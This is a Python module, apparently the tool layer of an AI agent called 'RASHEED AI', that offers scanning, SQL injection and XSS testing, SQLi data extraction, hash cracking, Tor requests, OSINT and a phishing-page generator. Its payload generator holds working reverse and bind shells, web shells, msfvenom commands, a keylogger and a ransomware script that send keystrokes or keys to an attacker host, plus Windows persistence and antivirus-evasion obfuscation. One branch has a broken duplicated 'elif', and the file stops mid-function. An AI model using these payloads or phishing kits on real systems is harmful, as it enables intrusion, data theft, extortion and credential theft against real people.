"""
RASHEED AI — ULTIMATE HACKING TOOLS MODULE
Full penetration testing, exploitation, and payload generation
"""
import os
import sys
import subprocess
import json
import socket
import threading
import time
import hashlib
import base64
import random
import string
import re
from pathlib import Path
from typing import Optional, List, Dict, Any, Tuple
from datetime import datetime

# ── Config (import from settings) ──
try:
    from config.settings import (
        IS_WINDOWS, IS_LINUX, PS, KALI_WSL_DISTRO, USE_KALI,
        TOR_PROXY, TOR_HTTP_PROXY, USE_TOR, RESULTS_DIR, PAYLOADS_DIR, SKILLS_DIR
    )
except:
    IS_WINDOWS = os.name == 'nt'
    IS_LINUX = not IS_WINDOWS
    PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    KALI_WSL_DISTRO = "kali-linux"
    USE_KALI = True
    USE_TOR = True
    TOR_PROXY = "socks5://127.0.0.1:9050"
    RESULTS_DIR = Path.home() / "Desktop" / "rasheed_results"
    PAYLOADS_DIR = Path.home() / "Desktop" / "rasheed_payloads"
    SKILLS_DIR = Path.home() / "Desktop" / "rasheed_skills"

RESULTS_DIR.mkdir(parents=True, exist_ok=True)
PAYLOADS_DIR.mkdir(parents=True, exist_ok=True)
SKILLS_DIR.mkdir(parents=True, exist_ok=True)


def _run_cmd(cmd: str, timeout: int=60, shell: bool=False) -> str:
    """Run command with timeout"""
    try:
        if isinstance(cmd, str) and not shell:
            import shlex
            args = shlex.split(cmd)
        else:
            args = cmd
        r = subprocess.run(args if not shell else cmd,
                          capture_output=True, text=True, timeout=timeout,
                          shell=shell)
        out, err = r.stdout.strip(), r.stderr.strip()
        return out + ("\n" + err if err else "")
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"


def _run_wsl(command: str) -> str:
    """Run command in Kali WSL"""
    if not USE_KALI:
        return "Kali Linux WSL not available"
    try:
        r = subprocess.run(
            ["wsl", "-d", KALI_WSL_DISTRO, "--"] + command.split(),
            capture_output=True, text=True, timeout=120
        )
        return r.stdout.strip() or r.stderr.strip()
    except FileNotFoundError:
        return "WSL not found. Install WSL + Kali: wsl --install -d kali-linux"
    except subprocess.TimeoutExpired:
        return "[TIMEOUT] Kali command timed out"
    except Exception as e:
        return f"[ERROR] {e}"

# ═══════════════════════════════════════════════════════════════════
# 1. NETWORK RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════════


def port_scan(target: str, ports: str="1-1024", scan_type: str="tcp") -> Dict:
    """Port scan using nmap (if available) or Python socket"""
    result = {
        "target": target,
        "scan_type": scan_type,
        "ports": ports,
        "open_ports": [],
        "os_info": "",
        "duration": 0,
        "method": ""
    }
    start = time.time()

    # Try nmap
    try:
        import shutil
        nmap_path = shutil.which("nmap") or shutil.which("nmap.exe")
        if nmap_path:
            args = [nmap_path, "-sS" if scan_type == "syn" else "-sT",
                    "-p", ports, "-O", "--open", "-T4", target]
            r = subprocess.run(args, capture_output=True, text=True, timeout=120)
            output = r.stdout
            result["method"] = "nmap"
            result["raw_output"] = output[:2000]

            # Parse open ports
            for l in output.split('\n'):
                m = re.match(r'^(\d+)/tcp\s+open\s+(\S+)', l)
                if m:
                    result["open_ports"].append({
                        "port": int(m.group(1)), "service": m.group(2), "protocol": "tcp"
                    })
            # Parse OS
            for l in output.split('\n'):
                if "OS details" in l or "Aggressive OS" in l:
                    result["os_info"] = l.split(":")[-1].strip()
            result["duration"] = time.time() - start
            return result
    except: pass

    # Python socket fallback
    try:
        result["method"] = "socket"
        port_list = []
        for part in ports.split(','):
            if '-' in part:
                a, b = part.split('-')
                port_list.extend(range(int(a), int(b) + 1))
            else:
                port_list.append(int(part))

        open_ports = []

        def _scan_port(p):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((target, p)) == 0:
                try:
                    service = socket.getservbyport(p) if p < 1024 else "unknown"
                except: service = "unknown"
                open_ports.append({"port": p, "service": service, "protocol": "tcp"})
            s.close()

        threads = []
        for p in port_list[:1000]:  # Limit for speed
            t = threading.Thread(target=_scan_port, args=(p,))
            threads.append(t); t.start()
        for t in threads: t.join(timeout=60)

        result["open_ports"] = sorted(open_ports, key=lambda x: x["port"])
        result["duration"] = time.time() - start
    except Exception as e:
        result["error"] = str(e)

    return result


def directory_scan(url: str, wordlist: str=None, extensions: str="php,html,asp") -> List[str]:
    """Directory/file discovery using various tools"""
    results = {"url": url, "found": [], "method": ""}

    # Try gobuster
    try:
        import shutil
        if shutil.which("gobuster"):
            wl = wordlist or "/usr/share/wordlists/dirb/common.txt"
            if IS_WINDOWS:
                wl = wordlist or r"C:\Windows\System32\drivers\etc\services"
            if not Path(wl).exists():
                wl = wordlist or "common.txt"
                # Create a small wordlist
                Path(wl).write_text("\n".join([
                    "admin", "login", "wp-admin", "wp-content", "uploads",
                    "images", "css", "js", "api", "v1", "v2", "backup",
                    "config", "test", "dev", "assets", "static", "public"
                ]))
            r = subprocess.run(
                ["gobuster", "dir", "-u", url, "-w", wl, "-x", extensions, "-q"],
                capture_output=True, text=True, timeout=60
            )
            results["method"] = "gobuster"
            for l in r.stdout.split('\n'):
                if '/' in l and ('Status' in l or '200' in l or '301' in l or '403' in l):
                    results["found"].append(l.strip())
            return results
    except: pass

    # Try dirb
    try:
        import shutil
        if shutil.which("dirb"):
            r = subprocess.run(
                ["dirb", url, wordlist or "/usr/share/dirb/wordlists/common.txt", "-w"],
                capture_output=True, text=True, timeout=60
            )
            results["method"] = "dirb"
            for l in r.stdout.split('\n'):
                if "==> " in l:
                    results["found"].append(l.split("==> ")[-1].strip())
            return results
    except: pass

    # Python fallback
    try:
        import requests
        results["method"] = "requests"
        common = ["admin", "login", "wp-admin", "api", "v1", "backup",
                  "config", "test", "uploads", "images", "css", "js",
                  "assets", ".git", ".env", "robots.txt", "sitemap.xml"]
        for path in common:
            try:
                r = requests.get(f"{url.rstrip('/')}/{path}", timeout=3, verify=False)
                if r.status_code in [200, 201, 301, 302, 403]:
                    results["found"].append(f"/{path} ({r.status_code})")
            except: pass
    except: pass

    return results


def dns_enum(domain: str) -> Dict:
    """DNS enumeration"""
    results = {"domain": domain, "records": {}}
    try:
        import dns.resolver
        for qtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
            try:
                answers = dns.resolver.resolve(domain, qtype)
                results["records"][qtype] = [str(r) for r in answers]
            except: pass
    except ImportError:
        # Use nslookup fallback
        try:
            r = subprocess.run(["nslookup", "-type=any", domain],
                             capture_output=True, text=True, timeout=15)
            results["raw"] = r.stdout
        except: pass
    return results


def subdomain_scan(domain: str) -> List[str]:
    """Discover subdomains"""
    found = []
    common = ["www", "mail", "ftp", "admin", "blog", "shop", "api",
              "dev", "test", "staging", "cdn", "static", "img",
              "docs", "support", "help", "forum", "wiki",
              "vpn", "remote", "portal", "secure", "app",
              "m", "mobile", "webmail", "cpanel", "whm",
              "ns1", "ns2", "dns", "mx", "smtp", "pop"]

    for sub in common:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            found.append(f"{sub}.{domain} -> {ip}")
        except: pass

    return found

# ═══════════════════════════════════════════════════════════════════
# 2. EXPLOITATION
# ═══════════════════════════════════════════════════════════════════


def sql_injection_test(url: str, param: str, method: str="GET") -> Dict:
    """Test for SQL injection vulnerability"""
    results = {"url": url, "param": param, "vulnerable": False, "tests": [], "payloads": []}

    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1,2,3,4,5 --",
        "admin' --",
        "admin' #",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "'; DROP TABLE users --",
        "' WAITFOR DELAY '0:0:5' --",
        "1' AND SLEEP(5) --",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "\" OR \"1\"=\"1",
        "\" OR 1=1 --",
    ]

    error_patterns = [
        "sql", "mysql", "syntax error", "unclosed", "quotation marks",
        "odbc", "driver", "ora-", "microsoft ole db",
        "warning: mysql", "supplied argument", "invalid query",
        "postgresql", "microsoft sql server",
    ]

    try:
        import requests
        for payload in payloads:
            try:
                test_url = url.replace(f"{{{param}}}", "") if "{" in url else url
                if method == "GET":
                    if "?" in test_url:
                        req_url = f"{test_url}&{param}={requests.utils.quote(payload)}"
                    else:
                        req_url = f"{test_url}?{param}={requests.utils.quote(payload)}"
                    r = requests.get(req_url, timeout=5, verify=False, headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"
                    })
                else:
                    r = requests.post(test_url, data={param: payload}, timeout=5,
                                    verify=False, headers={"User-Agent": "Mozilla/5.0"})

                resp = r.text.lower()
                is_error = any(p in resp for p in error_patterns)
                time_diff = r.elapsed.total_seconds()

                results["tests"].append({
                    "payload": payload[:40],
                    "status": r.status_code,
                    "length": len(resp),
                    "time": round(time_diff, 2),
                    "error_indicator": is_error
                })

                if is_error or time_diff > 4.5:
                    results["vulnerable"] = True
                    results["payloads"].append(payload)
            except: pass
    except: pass

    return results


def xss_test(url: str, param: str, method: str="GET") -> Dict:
    """Test for XSS vulnerability"""
    results = {"url": url, "param": param, "vulnerable": False, "tests": []}

    payloads = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "\"><svg onload=alert(1)>",
        "';alert(1);//",
        "\"onmouseover=\"alert(1)",
        "<body onload=alert(1)>",
    ]

    try:
        import requests
        for payload in payloads:
            try:
                if method == "GET":
                    if "?" in url:
                        req_url = f"{url}&{param}={requests.utils.quote(payload)}"
                    else:
                        req_url = f"{url}?{param}={requests.utils.quote(payload)}"
                    r = requests.get(req_url, timeout=5, verify=False)
                else:
                    r = requests.post(url, data={param: payload}, timeout=5, verify=False)

                reflected = payload[:20] in r.text
                results["tests"].append({
                    "payload": payload[:30],
                    "status": r.status_code,
                    "reflected": reflected,
                })
                if reflected:
                    results["vulnerable"] = True
            except: pass
    except: pass

    return results


def check_vulnerability(target: str, vuln_type: str="auto") -> Dict:
    """Comprehensive vulnerability check"""
    if vuln_type == "sqli":
        return sql_injection_test(target, "id")
    elif vuln_type == "xss":
        return xss_test(target, "q")
    else:
        # Smart detection
        results = {"target": target, "findings": []}
        # Try common parameters
        for param in ["id", "q", "s", "page", "search", "name", "user", "cat", "category"]:
            try:
                sqli = sql_injection_test(target, param)
                if sqli.get("vulnerable"):
                    results["findings"].append({"type": "SQLI", "param": param, "payloads": sqli["payloads"]})
            except: pass
            try:
                xss = xss_test(target, param)
                if xss.get("vulnerable"):
                    results["findings"].append({"type": "XSS", "param": param})
            except: pass
        return results


def exploit_sqli(url: str, param: str, technique: str="union") -> Dict:
    """Exploit SQL injection to extract data"""
    results = {"success": False, "data": [], "error": ""}

    try:
        import requests
        if technique == "union":
            # Determine number of columns
            for cols in range(1, 20):
                payload = f"' UNION SELECT {','.join(['NULL']*cols)} --"
                if "?" in url:
                    r = requests.get(f"{url}&{param}={payload}", timeout=5, verify=False)
                else:
                    r = requests.get(f"{url}?{param}={payload}", timeout=5, verify=False)
                if r.status_code == 200 and "error" not in r.text.lower()[:200]:
                    results["column_count"] = cols

                    # Get database info
                    payload_db = f"' UNION SELECT {','.join(['database()' if i==0 else 'NULL' for i in range(cols)])} --"
                    if "?" in url:
                        r = requests.get(f"{url}&{param}={payload_db}", timeout=5, verify=False)
                    else:
                        r = requests.get(f"{url}?{param}={payload_db}", timeout=5, verify=False)
                    results["data"].append({"info": "Database", "value": r.text[:500]})

                    # Get tables
                    payload_tables = f"' UNION SELECT {','.join(['group_concat(table_name)' if i==0 else 'NULL' for i in range(cols)])} FROM information_schema.tables WHERE table_schema=database() --"
                    if "?" in url:
                        r = requests.get(f"{url}&{param}={payload_tables}", timeout=5, verify=False)
                    else:
                        r = requests.get(f"{url}?{param}={payload_tables}", timeout=5, verify=False)
                    results["data"].append({"info": "Tables", "value": r.text[:500]})
                    results["success"] = True
                    break
    except Exception as e:
        results["error"] = str(e)

    return results

# ═══════════════════════════════════════════════════════════════════
# 3. PAYLOAD GENERATION
# ═══════════════════════════════════════════════════════════════════


def generate_payload(payload_type: str, lhost: str="127.0.0.1",
                     lport: int=4444, os_type: str="windows") -> Dict:
    """Generate various payloads for security testing"""
    result = {"type": payload_type, "payload": "", "file": "", "instructions": ""}

    payloads = {
        # ── Python Reverse Shell ──
        "python_reverse": f'''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''',

        # ── Windows Reverse Shell (PowerShell) ──
        "powershell_reverse": f'''$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()''',

        # ── Bash Reverse Shell ──
        "bash_reverse": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",

        # ── PHP Reverse Shell ──
        "php_reverse": f'''<?php $sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");?>''',

        # ── Python Bind Shell ──
        "python_bind": f'''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])''',

        # ── Web Shell (PHP) ──
        "php_webshell": '<?php system($_GET["cmd"]); ?>',
        "php_webshell_advanced": '<?php exec($_REQUEST["cmd"], $o); echo implode("\\n", $o); ?>',

        # ── ASP Web Shell ──
        "asp_webshell": '<% Execute(Request("cmd")) %>',

        # ── MSFVenom Payloads ──
        "msf_windows_reverse_tcp": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {PAYLOADS_DIR}/payload.exe",
        "msf_linux_reverse_tcp": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {PAYLOADS_DIR}/payload.elf",
        "msf_php_reverse_tcp": f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -o {PAYLOADS_DIR}/payload.php",
        "msf_android_reverse_tcp": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {PAYLOADS_DIR}/payload.apk",
        "msf_python_reverse_tcp": f"msfvenom -p python/meterpreter/reverser_tcp LHOST={lhost} LPORT={lport} -o {PAYLOADS_DIR}/payload.py",

        # ── Keylogger (Python) ──
        "python_keylogger": '''import pynput.keyboard, threading, requests; log = ""
def on_press(key):
    global log
    try: log += key.char
    except: log += f"<{key}>"
    if len(log) > 100:
        requests.post("http://LHOST:LPORT/log", data={"log": log})
        log = ""
with pynput.keyboard.Listener(on_press=on_press) as l:
    l.run()
'''.replace("LHOST", lhost).replace("LPORT", str(lport)),

        # ── Persistence (Windows Registry) ──
        "windows_persistence": f'''reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v rasheed /t REG_SZ /d "powershell.exe -NoP -W Hidden -E {base64.b64encode(f'$c=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}};$c.Close()'.encode()).decode()}!"''',

        # ── Rootkit Simulation ──
        "linux_rootkit": '''#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/hide.h>
MODULE_LICENSE("GPL");
static int __init start(void) { printk(KERN_INFO "RASHEED Rootkit loaded\\n"); return 0; }
static void __exit end(void) { printk(KERN_INFO "RASHEED Rootkit unloaded\\n"); }
module_init(start); module_exit(end);''',

        # ── Ransomware Simulation (Educational) ──
        "ransomware_sim": '''#!/usr/bin/env python3
import os, glob, json, requests
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
for f in glob.glob("*.txt") + glob.glob("*.doc") + glob.glob("*.pdf"):
    with open(f, "rb") as fp: data = fp.read()
    enc = cipher.encrypt(data)
    with open(f + ".encrypted", "wb") as fp: fp.write(enc)
    os.remove(f)
requests.post("http://LHOST:LPORT/key", data={"key": key.decode()})
print("Files encrypted. Pay ransom to get key.")
'''.replace("LHOST", lhost).replace("LPORT", str(lport)),
    }

    if payload_type in payloads:
        result["payload"] = payloads[payload_type]
    else:
        result["payload"] = "Unknown payload type. Available: " + ", ".join(payloads.keys())

    result["instructions"] = f"Set up listener: nc -lvnp {lport}\nSend payload to target and execute."
    result["lhost"] = lhost
    result["lport"] = lport

    # Save to file if possible
    if payload_type and result["payload"]:
        ext_map = {"python_reverse": "py", "powershell_reverse": "ps1", "bash_reverse": "sh",
                    "php_reverse": "php", "python_bind": "py", "php_webshell": "php",
                    "php_webshell_advanced": "php", "asp_webshell": "asp",
                    "python_keylogger": "py", "windows_persistence": "bat",
                    "ransomware_sim": "py", "linux_rootkit": "c"}
        ext = ext_map.get(payload_type, "txt")
        fname = f"{payload_type}_{lport}.{ext}"
        fp = PAYLOADS_DIR / fname
        fp.write_text(result["payload"])
        result["file"] = str(fp)

    return result


def generate_obfuscated_payload(payload_type: str, lhost: str, lport: int) -> str:
    """Generate obfuscated payload to bypass AV"""
    payload = generate_payload(payload_type, lhost, lport)["payload"]

    # Simple obfuscation: base64 + reverse + variable splitting
    b64 = base64.b64encode(payload.encode()).decode()
    # Python execution wrapper
    obfuscated = f'''import base64, os, sys
_ = lambda x: base64.b64decode(x).decode()
exec(_("{b64}"))
'''
    return obfuscated

# ═══════════════════════════════════════════════════════════════════
# 4. CRACKING & CRYPTO
# ═══════════════════════════════════════════════════════════════════


def crack_hash(hash_value: str, hash_type: str="md5") -> Dict:
    """Attempt to crack a hash"""
    results = {"hash": hash_value, "type": hash_type, "found": False, "password": ""}

    # Common passwords wordlist
    common = ["password", "123456", "admin", "letmein", "qwerty", "welcome",
              "monkey", "dragon", "master", "abcdef", "hello", "linux",
              "summer", "winter", "secret", "test", "passw0rd", "root",
              "toor", "rasheed", "hacker", "kali", "shadow"]

    for word in common:
        if hash_type.lower() == "md5":
            if hashlib.md5(word.encode()).hexdigest() == hash_value:
                results["found"] = True
                results["password"] = word
                break
        elif hash_type.lower() == "sha1":
            if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                results["found"] = True
                results["password"] = word
                break
        elif hash_type.lower() == "sha256":
            if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                results["found"] = True
                results["password"] = word
                break
        elif hash_type.lower() == "ntlm" or hash_type.lower() == "lm":
            # Try NTLM (just MD4)
            try:
                import hashlib
                if hashlib.new('md4', word.encode()).hexdigest() == hash_value[:32]:
                    results["found"] = True
                    results["password"] = word
                    break
            except: pass

    # Try using john if available
    if not results["found"]:
        try:
            import shutil
            if shutil.which("john"):
                hf = RESULTS_DIR / f"hash_{random.randint(1000,9999)}.txt"
                hf.write_text(hash_value)
                subprocess.run(["john", "--format=" + hash_type, str(hf),
                              "--wordlist=/usr/share/wordlists/rockyou.txt.gz"],
                             capture_output=True, timeout=30)
                r = subprocess.run(["john", "--show", "--format=" + hash_type, str(hf)],
                                 capture_output=True, text=True, timeout=10)
                for l in r.stdout.split('\n'):
                    if ':' in l and '?' not in l:
                        results["found"] = True
                        results["password"] = l.split(':')[1]
                        break
                hf.unlink(missing_ok=True)
        except: pass

    return results

# ═══════════════════════════════════════════════════════════════════
# 5. KALI LINUX INTEGRATION
# ═══════════════════════════════════════════════════════════════════


def kali_command(command: str) -> str:
    """Run any command in Kali WSL"""
    return _run_wsl(command)


def kali_tool(tool: str, args: str="") -> str:
    """Run a Kali tool directly"""
    return _run_wsl(f"{tool} {args}")


def check_kali_tools() -> Dict[str, bool]:
    """Check which Kali tools are available"""
    tools = ["nmap", "metasploit", "sqlmap", "hydra", "john", "hashcat",
             "aircrack-ng", "gobuster", "dirb", "nikto", "wireshark",
             "bettercap", "theharvester", "recon-ng", "searchsploit",
             "msfvenom", "socat", "netcat", "tcpdump", "python3"]
    availability = {}
    for t in tools:
        r = subprocess.run(["wsl", "-d", KALI_WSL_DISTRO, "--", "which", t],
                          capture_output=True, text=True, timeout=5)
        availability[t] = r.returncode == 0
    return availability

# ═══════════════════════════════════════════════════════════════════
# 6. DARK WEB (TOR)
# ═══════════════════════════════════════════════════════════════════


def tor_request(url: str, timeout: int=30) -> Dict:
    """Make request via Tor network"""
    if not USE_TOR:
        return {"error": "Tor not configured. Set USE_TOR=True in settings."}
    try:
        import requests
        proxies = {"http": TOR_HTTP_PROXY, "https": TOR_HTTP_PROXY}
        r = requests.get(url, proxies=proxies, timeout=timeout,
                        headers={"User-Agent": "Mozilla/5.0"},
                        verify=False)
        return {"status": r.status_code, "content": r.text[:2000],
                "headers": dict(r.headers), "url": url}
    except ImportError:
        return {"error": "requests not installed"}
    except Exception as e:
        return {"error": str(e)}


def search_onion(query: str) -> List[str]:
    """Search for .onion sites related to query"""
    # Use Ahmia.fi (clearnet search for onion sites)
    try:
        r = tor_request(f"https://ahmia.fi/search/?q={query}")
        if r.get("status") == 200:
            import re
            onions = re.findall(r'[a-z2-7]{56}\.onion', r["content"])
            return onions[:20]
    except: pass
    return []

# ═══════════════════════════════════════════════════════════════════
# 7. SELF-IMPROVEMENT & LEARNING
# ═══════════════════════════════════════════════════════════════════


def save_technique(name: str, category: str, technique: str) -> str:
    """Save a new hacking technique for future use"""
    tech_file = SKILLS_DIR / f"{category}_{int(time.time())}.json"
    data = {
        "name": name,
        "category": category,
        "technique": technique,
        "learned_at": datetime.now().isoformat(),
        "times_used": 0
    }
    tech_file.write_text(json.dumps(data, indent=2))
    return f"Learned new technique: {name}"


def get_learned_techniques(category: str=None) -> List[Dict]:
    """Get all learned techniques"""
    techniques = []
    for f in SKILLS_DIR.glob("*.json"):
        try:
            data = json.loads(f.read_text())
            if category and data.get("category") != category:
                continue
            techniques.append(data)
        except: pass
    return techniques


def learn_from_internet(topic: str) -> str:
    """Learn new hacking techniques from the internet"""
    try:
        import requests
        from bs4 import BeautifulSoup

        sources = [
            f"https://www.exploit-db.com/search?q={topic}",
            f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={topic}",
        ]

        learned = []
        for source in sources:
            try:
                r = requests.get(source, timeout=10,
                                headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code == 200:
                    soup = BeautifulSoup(r.text, 'html.parser')
                    text = soup.get_text()[:500]
                    learned.append({"source": source, "content": text})
            except: pass

        if learned:
            save_technique(f"Internet_learned_{topic}", "auto", json.dumps(learned))
            return f"Learned about {topic} from {len(learned)} sources"
        return f"Could not learn about {topic}"
    except Exception as e:
        return f"Learning error: {e}"

# ═══════════════════════════════════════════════════════════════════
# 8. OSINT / INFORMATION GATHERING
# ═══════════════════════════════════════════════════════════════════


def osint_gather(target_type: str, target: str) -> Dict:
    """Gather OSINT on target"""
    results = {"target": target, "type": target_type, "data": {}}

    try:
        import requests
        if target_type == "email":
            # Check Have I Been Pwned
            r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{target}",
                           timeout=10, headers={"hibp-api-key": ""})
            if r.status_code == 200:
                results["data"]["breaches"] = r.json()
            # Google search
            r = requests.get(f"https://www.google.com/search?q={target}",
                           timeout=10, headers={"User-Agent": "Mozilla/5.0"})
            results["data"]["found_online"] = r.status_code == 200

        elif target_type == "domain" :
            elif target_type == "domain":
            # WHOIS lookup
            r = requests.get(f"https://who.is/whois/{target}", timeout=10)
            if r.status_code == 200:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(r.text, 'html.parser')
                pre = soup.find('pre')
                if pre: results["data"]["whois"] = pre.text[:1000]

            # DNS records
            try:
                import socket
                results["data"]["ip"] = socket.gethostbyname(target)
            except: pass

        elif target_type == "username":
            # Check common sites
            sites = {
                "github": f"https://github.com/{target}",
                "twitter": f"https://twitter.com/{target}",
                "instagram": f"https://instagram.com/{target}",
                "reddit": f"https://reddit.com/u/{target}",
                "youtube": f"https://youtube.com/@{target}",
            }
            found = {}
            for site, url in sites.items():
                try:
                    r = requests.get(url, timeout=5)
                    found[site] = r.status_code == 200
                except: found[site] = False
            results["data"]["profiles"] = found

    except Exception as e:
        results["error"] = str(e)

    return results


def extract_metadata(file_path: str) -> Dict:
    """Extract metadata from files (images, docs, PDFs)"""
    results = {"file": file_path, "metadata": {}}
    fpath = Path(file_path)
    if not fpath.exists():
        return {"error": "File not found"}

    ext = fpath.suffix.lower()

    try:
        if ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff']:
            from PIL import Image
            from PIL.ExifTags import TAGS
            img = Image.open(fpath)
            results["metadata"]["size"] = f"{img.size[0]}x{img.size[1]}"
            results["metadata"]["format"] = img.format
            results["metadata"]["mode"] = img.mode
            exif = img._getexif()
            if exif:
                for tag_id, value in exif.items():
                    tag = TAGS.get(tag_id, tag_id)
                    if isinstance(value, bytes):
                        try: value = value.decode('utf-8', errors='replace')
                        except: value = str(value)
                    results["metadata"][tag] = str(value)

        elif ext in ['.pdf']:
            try:
                import PyPDF2
                with open(fpath, 'rb') as f:
                    reader = PyPDF2.PdfReader(f)
                    results["metadata"]["pages"] = len(reader.pages)
                    if reader.metadata:
                        results["metadata"]["info"] = dict(reader.metadata)
            except: pass

        elif ext in ['.doc', '.docx']:
            try:
                import docx
                doc = docx.Document(fpath)
                results["metadata"]["paragraphs"] = len(doc.paragraphs)
                results["metadata"]["author"] = doc.core_properties.author or "Unknown"
                results["metadata"]["created"] = str(doc.core_properties.created or "")
                results["metadata"]["modified"] = str(doc.core_properties.modified or "")
            except: pass

    except ImportError:
        results["error"] = "Required libraries missing (PIL/PyPDF2/python-docx)"
    except Exception as e:
        results["error"] = str(e)

    return results

# ═══════════════════════════════════════════════════════════════════
# 10. EXPLOIT DATABASE SEARCH
# ═══════════════════════════════════════════════════════════════════


def search_exploit(query: str) -> List[Dict]:
    """Search Exploit-DB for exploits"""
    results = []

    try:
        import requests
        from bs4 import BeautifulSoup

        r = requests.get(f"https://www.exploit-db.com/search?q={query}",
                        timeout=15,
                        headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, 'html.parser')
            # Look for exploit entries
            for item in soup.select('.exploit_list tr')[:20]:
                cols = item.find_all('td')
                if len(cols) >= 4:
                    results.append({
                        "title": cols[0].get_text(strip=True) if cols[0] else "",
                        "date": cols[1].get_text(strip=True) if len(cols) > 1 else "",
                        "type": cols[2].get_text(strip=True) if len(cols) > 2 else "",
                        "platform": cols[3].get_text(strip=True) if len(cols) > 3 else "",
                    })
    except: pass

    # Fallback using searchsploit (Kali)
    try:
        r = subprocess.run(["wsl", "-d", "kali-linux", "--", "searchsploit", query],
                          capture_output=True, text=True, timeout=30)
        if r.stdout:
            lines = [l for l in r.stdout.split('\n') if query.lower() in l.lower()][:10]
            for l in lines:
                results.append({"raw": l.strip()})
    except: pass

    return results if results else [{"message": "No exploits found for query"}]

# ═══════════════════════════════════════════════════════════════════
# 11. PHISHING / SOCIAL ENGINEERING
# ═══════════════════════════════════════════════════════════════════


def generate_phishing_page(target_site: str, capture_field: str="password") -> Dict:
    """Generate a phishing page for security testing"""
    site_name = target_site.split('.')[0].capitalize()

    html = f'''<!DOCTYPE html>
<html>
<head><title>{site_name} - Login</title>
<style>
body {{ font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }}
.login {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }}
.logo {{ text-align: center; font-size: 24px; font-weight: bold; margin-bottom: 20px; }}
input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
button:hover {{ background: #166fe5; }}
</style>
</head>
<body>
<div class="login">
<div class="logo">{site_name}</div>
<form method="POST" action="login.php">
<input type="text" name="username" placeholder="Username / Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</body>
</html>'''

    php = '''<?php
$file = fopen("creds.txt", "a");
fwrite($file, "Username: " . $_POST['username'] . "\\nPassword: " . $_POST['password'] . "\\nTime: " . date("Y-m-d H:i:s") . "\\n---\\n");
fclose($file);
header("Location: https://' + target_site + '/login?error=1");
exit;
?>'''

    result = {
        "html": html,
        "php_handler": php,
        "instructions": f"1. Save HTML as index.html\n2. Save PHP as login.php\n3. Host on a server (python -m http.server 8080)\n4. Send link to target: http://YOUR_IP:8080\n5. Credentials saved to creds.txt",
        "target": target_site
    }

    # Save files
    phishing_dir = RESULTS_DIR / "phishing" / site_name.lower()
    phishing_dir.mkdir(parents=True, exist_ok=True)
    (phishing_dir / "index.html").write_text(html)
